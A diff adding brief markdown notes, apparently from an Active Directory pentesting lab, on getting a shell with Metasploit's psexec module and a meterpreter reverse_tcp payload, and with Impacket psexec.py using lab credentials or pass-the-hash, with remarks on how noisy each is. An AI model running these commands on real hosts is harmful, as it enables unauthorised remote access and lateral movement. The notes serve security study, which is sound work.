@@ -1,0 +1,16 @@
+# Gaining Shell Access
+
+- Using metasploit:
+    - use exploit/windows/smb/psexec
+    - options
+        - set RHOSTS, RPORT (445), SMBDomain (MARVEL.local), SMBPass (Password1), and SMBUser (fcastle)
+        - set payload windows/x64/meterpreter/reverse_tcp
+        - Can use hash instead of password
+        - Very noisy
+        - can use ‘background’ and ‘sessions’ to switch on/off
+- psexec.py
+    - [psexec.py](http://psexec.py) marvel.local/fcastle:’Password1’@<target ip>
+    - much quieter
+    - can use a hash instead with this:
+        - [psexec.py](http://psexec.py) administrator@<target_ip> -hashes <hash_value>
+-
